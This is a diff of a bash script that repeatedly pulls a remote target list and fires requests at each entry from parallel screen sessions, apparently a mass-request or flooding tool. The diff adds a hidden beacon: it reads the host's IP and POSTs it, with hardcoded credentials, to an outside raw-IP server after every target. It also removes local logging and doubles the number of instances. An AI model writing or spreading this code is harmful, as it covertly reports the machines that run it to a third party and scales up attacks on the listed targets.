@@ -60,6 +60,7 @@ run(){
     echo -e \"\$counter - \$1 - resulted response:\n\$(date) \$response2 \n\" 
 }
 
+ip=\$(hostname -I | cut -d ' ' -f 1)
 while true
 do	
   readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
@@ -67,8 +68,9 @@ do
     counter=0
     for i in \"\${list[@]}\"
     do
-        run \"\${list[counter]}\" >> out\$1.txt
+        run \"\${list[counter]}\"
         let counter=counter+1
+        curl -X POST --user test:o77yqwjjd -v \"http://3.65.18.132:8854/send\" -d \"\$ip \$1\"
     done
   done
 done
@@ -77,7 +79,7 @@ chmod +x screen.sh
 
 sudo apt install screen -y
 
-for i in {1..5}; do
+for i in {1..10}; do
     echo -e "\nscreen -d -m -L -S screen$i ./screen.sh $i"
     sleep 5
     screen -d -m -L -S screen$i ./screen.sh $i
